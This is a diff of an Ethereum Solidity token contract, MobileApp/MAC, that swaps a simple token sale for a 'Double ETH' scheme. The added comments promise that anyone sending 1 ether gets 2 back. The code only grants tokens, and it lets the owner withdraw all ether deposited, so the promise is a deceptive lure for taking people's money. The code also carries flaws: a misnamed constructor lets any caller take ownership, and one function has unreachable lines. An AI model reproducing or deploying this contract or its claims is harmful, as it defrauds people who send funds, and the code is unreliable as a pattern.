@@ -1,86 +1,251 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract MobileApp at 0xe08056c9b08ad8cc575fe77eb60b991bfdb43366
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract MobileApp at 0x2be511409c976bdcd141642969ece04cd1171403
 */
-// Mobile Application Real Contract address
-// Website = mobileapp.tours
-// Coming Soon listing Big Exchange
+pragma solidity ^0.4.22;
+// []Fuction Double ETH
+// []=> Send 1 Ether to this Contract address and you will get 2 Ether from balance
+// [Balance]=> 0x0000000000000000000000000000000000000000
 
-pragma solidity ^0.4.15;
+// *Listing coinmarketcap & coingecko if the address contract storage reaches 5 ether*
 
-interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }
+// Send 0 ETH to this contract address 
+// you will get a free MobileAppCoin
+// every wallet address can only claim 1x
+// Balance MobileAppCoin => 0x0000000000000000000000000000000000000000
 
-contract MobileApp{
-    // Public variables of the token
-    string public name = "MobileApplication";
-    string public symbol = "MAPP";
-    uint8 public decimals = 18;
-    // 18 decimals is the strongly suggested default
+// MobileAppCoin
+// website: http://mobileapp.tours
+// Twitter: https://twitter.com/mobileappcoin
+// contact: support@mobileapp.tours
+// Telegram: https://t.me/mobileapptours
+// Linkedin: https://www.linkedin.com/in/mobile-app-285211163/
+// Medium: https://medium.com/@mobileappcoin
+// Comingsoon : https://coinmarketcap.com/currencies/MAC/
+//              https://www.coingecko.com/en/coins/MAC/            
+
+
+library SafeMath {
+  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+    uint256 c = a * b;
+    assert(a == 0 || c / a == b);
+    return c;
+  }
+
+  function div(uint256 a, uint256 b) internal pure returns (uint256) {
+    uint256 c = a / b;
+    return c;
+  }
+
+  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+    assert(b <= a);
+    return a - b;
+  }
+
+  function add(uint256 a, uint256 b) internal pure returns (uint256) {
+    uint256 c = a + b;
+    assert(c >= a);
+    return c;
+  }
+}
+
+contract MobileAppCoin {
+    function balanceOf(address _owner) constant public returns (uint256);
+    function transfer(address _to, uint256 _value) public returns (bool);
+}
+
+contract ERC20Basic {
     uint256 public totalSupply;
-    uint256 public MobileAppSupply = 100000000;
-    uint256 public buyPrice = 1800000;
-    address public creator;
-    
-    mapping (address => uint256) public balanceOf;
-    mapping (address => mapping (address => uint256)) public allowance;
-
-    
+    function balanceOf(address who) public constant returns (uint256);
+    function transfer(address to, uint256 value) public returns (bool);
     event Transfer(address indexed from, address indexed to, uint256 value);
-    event FundTransfer(address backer, uint amount, bool isContribution);
-   
-   
-    /**
-     * Constrctor function
-     *
-     * Initializes contract with initial supply tokens to the creator of the contract
-     */
-    function MobileApp() public {
-        totalSupply = MobileAppSupply * 10 ** uint256(decimals);  // Update total supply with the decimal amount
-        balanceOf[msg.sender] = totalSupply;   
-        creator = msg.sender;
+}
+
+contract ERC20 is ERC20Basic {
+    function allowance(address owner, address spender) public constant returns (uint256);
+    function transferFrom(address from, address to, uint256 value) public returns (bool);
+    function approve(address spender, uint256 value) public returns (bool);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+interface Token { 
+    function distr(address _to, uint256 _value) external returns (bool);
+    function totalSupply() constant external returns (uint256 supply);
+    function balanceOf(address _owner) constant external returns (uint256 balance);
+}
+
+contract MobileApp is ERC20 {
+
+ 
+    
+    using SafeMath for uint256;
+    address owner = msg.sender;
+
+    mapping (address => uint256) balances;
+    mapping (address => mapping (address => uint256)) allowed;
+    mapping (address => bool) public blacklist;
+
+    string public constant name = "MobileApp";
+    string public constant symbol = "MAC";
+    uint public constant decimals = 18;
+    
+uint256 public totalSupply = 9999999999999e18;
+    
+uint256 public totalDistributed = 9999999999998e18;
+    
+uint256 public totalRemaining = totalSupply.sub(totalDistributed);
+    
+uint256 public value = 100000e18;
+
+
+
+    event Transfer(address indexed _from, address indexed _to, uint256 _value);
+    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
+    
+    event Distr(address indexed to, uint256 amount);
+    event DistrFinished();
+    
+    event Burn(address indexed burner, uint256 value);
+
+    bool public distributionFinished = false;
+    
+    modifier canDistr() {
+        require(!distributionFinished);
+        _;
     }
-    /**MAPP
-     * Internal transfer, only can be called by this contract
-     */
-    function _transfer(address _from, address _to, uint _value) internal {
-        // Prevent transfer to 0x0 address. Use burn() instead
-        require(_to != 0x0);
-        // Check if the sender has enough
-        require(balanceOf[_from] >= _value);
-        // Check for overflows
-        require(balanceOf[_to] + _value >= balanceOf[_to]);
-        // Subtract from the sender
-        balanceOf[_from] -= _value;
-        // Add the same to the recipient
-        balanceOf[_to] += _value;
-        Transfer(_from, _to, _value);
-     
+    
+    modifier onlyOwner() {
+        require(msg.sender == owner);
+        _;
+    }
+    
+    modifier onlyWhitelist() {
+        require(blacklist[msg.sender] == false);
+        _;
+    }
+    
+    function MAC() public {
+        owner = msg.sender;
+        balances[owner] = totalDistributed;
+    }
+    
+    function transferOwnership(address newOwner) onlyOwner public {
+        if (newOwner != address(0)) {
+            owner = newOwner;
+        }
+    }
+    
+    function finishDistribution() onlyOwner canDistr public returns (bool) {
+        distributionFinished = true;
+        emit DistrFinished();
+        return true;
+    }
+    
+    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
+        totalDistributed = totalDistributed.add(_amount);
+        totalRemaining = totalRemaining.sub(_amount);
+        balances[_to] = balances[_to].add(_amount);
+        emit Distr(_to, _amount);
+        emit Transfer(address(0), _to, _amount);
+        return true;
+        
+        if (totalDistributed >= totalSupply) {
+            distributionFinished = true;
+        }
+    }
+    
+    function () external payable {
+        getTokens();
+     }
+    
+    function getTokens() payable canDistr onlyWhitelist public {
+        if (value > totalRemaining) {
+            value = totalRemaining;
+        }
+        
+        require(value <= totalRemaining);
+        
+        address investor = msg.sender;
+        uint256 toGive = value;
+        
+        distr(investor, toGive);
+        
+        if (toGive > 0) {
+            blacklist[investor] = true;
+        }
+
+        if (totalDistributed >= totalSupply) {
+            distributionFinished = true;
+        }
+        
+        value = value.div(100000).mul(99999);
     }
 
-    /**
-     * Transfer tokens
-     *
-     * Send `_value` tokens to `_to` from your account
-     *
-     * @param _to The address of the recipient
-     * @param _value the amount to send
-     */
-    function transfer(address _to, uint256 _value) public {
-        _transfer(msg.sender, _to, _value);
+    function balanceOf(address _owner) constant public returns (uint256) {
+        return balances[_owner];
     }
 
-   
-   
-    /// @notice tokens from contract by sending ether
-    function () payable internal {
-        uint amount = msg.value * buyPrice;                    // calculates the amount, 
-        uint amountRaised;                                    
-        amountRaised += msg.value;                            //many thanks
-        require(balanceOf[creator] >= amount);               // checks if it has enough to sell
-        require(msg.value < 10**17);                        // so any person who wants to put more then 0.1 ETH has time to think about what they are doing
-        balanceOf[msg.sender] += amount;                  // adds the amount to buyer's balance
-        balanceOf[creator] -= amount;                        
-        Transfer(creator, msg.sender, amount);               // execute an event reflecting the change
-        creator.transfer(amountRaised);
+    modifier onlyPayloadSize(uint size) {
+        assert(msg.data.length >= size + 4);
+        _;
     }
+    
+    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
+        require(_to != address(0));
+        require(_amount <= balances[msg.sender]);
+        
+        balances[msg.sender] = balances[msg.sender].sub(_amount);
+        balances[_to] = balances[_to].add(_amount);
+        emit Transfer(msg.sender, _to, _amount);
+        return true;
+    }
+    
+    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
+        require(_to != address(0));
+        require(_amount <= balances[_from]);
+        require(_amount <= allowed[_from][msg.sender]);
+        
+        balances[_from] = balances[_from].sub(_amount);
+        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
+        balances[_to] = balances[_to].add(_amount);
+        emit Transfer(_from, _to, _amount);
+        return true;
+    }
+    
+    function approve(address _spender, uint256 _value) public returns (bool success) {
+        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
+        allowed[msg.sender][_spender] = _value;
+        emit Approval(msg.sender, _spender, _value);
+        return true;
+    }
+    
+    function allowance(address _owner, address _spender) constant public returns (uint256) {
+        return allowed[_owner][_spender];
+    }
+    
+    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
+        MobileAppCoin t = MobileAppCoin(tokenAddress);
+        uint bal = t.balanceOf(who);
+        return bal;
+    }
+    
+    function withdraw() onlyOwner public {
+        uint256 etherBalance = address(this).balance;
+        owner.transfer(etherBalance);
+    }
+    
+    function burn(uint256 _value) onlyOwner public {
+        require(_value <= balances[msg.sender]);
 
+        address burner = msg.sender;
+        balances[burner] = balances[burner].sub(_value);
+        totalSupply = totalSupply.sub(_value);
+        totalDistributed = totalDistributed.sub(_value);
+        emit Burn(burner, _value);
+    }
+    
+    function withdrawMobileAppCoin(address _tokenContract) onlyOwner public returns (bool) {
+        MobileAppCoin token = MobileAppCoin(_tokenContract);
+        uint256 amount = token.balanceOf(address(this));
+        return token.transfer(owner, amount);
+    }
 }
